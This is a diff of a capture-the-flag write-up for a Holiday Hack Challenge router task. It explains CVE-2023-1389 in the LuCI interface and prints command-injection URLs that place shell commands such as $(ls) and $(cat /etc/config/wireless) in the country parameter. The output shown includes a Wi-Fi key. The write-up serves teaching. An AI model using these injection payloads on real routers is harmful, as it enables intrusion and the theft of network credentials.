@@ -36,25 +36,44 @@ Difficulty: :material-star::material-star::material-star-outline::material-star-
 
 ## Solution
 
-??? success "Solution to question 1"
+The hints suggest that we have to look for a known vulnerability for this type of router. Using the version number listed on the webpage we can find an [exploit](https://www.exploit-db.com/exploits/51677) for CVE-2023-1389.
 
-```
+The webpage also contains this code that hints as looking for a debug endpoint:
+
+```js
 if (attempts >= 3) {
-    // Show special message after 3 attempts
-    errorDiv.textContent = 'Too many failed attempts. Try the debug console.';
+  // Show special message after 3 attempts
+  errorDiv.textContent = "Too many failed attempts. Try the debug console.";
 }
 
 // Add to console a hint for challenge
-console.log('Debug: Authentication failed. Have you tried checking the network for a debug endpoint?');
-
-https://www.exploit-db.com/exploits/51677
-
-https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(ls)
-https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cat%20/cgi-bin/status.cgi)
-https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cat%20/etc/config/wireless)
-
-config wifi-device 'radio0' option type 'mac80211' option channel '6' option hwmode '11g' option path 'platform/ahb/18100000.wmac' option htmode 'HT20' option country 'US' config wifi-device 'radio1' option type 'mac80211' option channel '36' option hwmode '11a' option path 'pci0000:00/0000:00:00.0' option htmode 'VHT80' option country 'US' config wifi-iface 'default_radio0' option device 'radio0' option network 'lan' option mode 'ap' option ssid 'DOSIS-247_2.4G' option encryption 'psk2' option key 'SprinklesAndPackets2025!' config wifi-iface 'default_radio1' option device 'radio1' option network 'lan' option mode 'ap' option ssid 'DOSIS-247_5G' option encryption 'psk2' option key 'SprinklesAndPackets2025!'
+console.log(
+  "Debug: Authentication failed. Have you tried checking the network for a debug endpoint?"
+);
 ```
+
+Since the exploit uses a vulnerability in the [LuCi](https://github.com/openwrt/luci) interface and this is related to configuration, we are likely looking at the correct vulnerability. We can use this to get the password of the router.
+
+We do not need run the exact exploit mentioned before. We can craft exploit URLs ourselves.
+
+??? success "Solution"
+
+    We craft the following URLs to exploit the vulnerability:
+    **Note**: we need to submit the URL twice to run the command (see commend on Exploit-DB.)
+
+    Verify that exploit works:
+    ```
+    https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(ls)
+    ```
+
+    Collect wireless config:
+    ```
+    https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cat%20/etc/config/wireless)
+
+    config wifi-device 'radio0' option type 'mac80211' option channel '6' option hwmode '11g' option path 'platform/ahb/18100000.wmac' option htmode 'HT20' option country 'US' config wifi-device 'radio1' option type 'mac80211' option channel '36' option hwmode '11a' option path 'pci0000:00/0000:00:00.0' option htmode 'VHT80' option country 'US' config wifi-iface 'default_radio0' option device 'radio0' option network 'lan' option mode 'ap' option ssid 'DOSIS-247_2.4G' option encryption 'psk2' option key 'SprinklesAndPackets2025!' config wifi-iface 'default_radio1' option device 'radio1' option network 'lan' option mode 'ap' option ssid 'DOSIS-247_5G' option encryption 'psk2' option key 'SprinklesAndPackets2025!'
+    ```
+
+    The password is `SprinklesAndPackets2025`.
 
 ## Response
 
